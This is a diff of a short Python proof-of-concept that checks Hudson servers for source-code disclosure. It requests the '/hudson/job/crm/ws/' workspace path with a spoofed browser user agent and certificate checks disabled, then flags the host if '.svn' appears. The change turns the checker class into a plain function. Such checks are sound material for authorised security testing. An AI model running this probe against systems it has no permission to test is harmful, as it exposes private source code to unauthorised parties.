@@ -9,19 +9,13 @@ description: 一种新型的漏洞Hudson利用方式，不用破解密码，不�
 import sys
 import warnings
 import requests
-
-
-class ws_disclosure_BaseVerify:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['hudson源代码泄露漏洞', '', '']
         headers = {
         "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/hudson/job/crm/ws/"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r".svn" in req.text:
@@ -35,5 +29,4 @@ class ws_disclosure_BaseVerify:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = ws_disclosure_BaseVerify(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
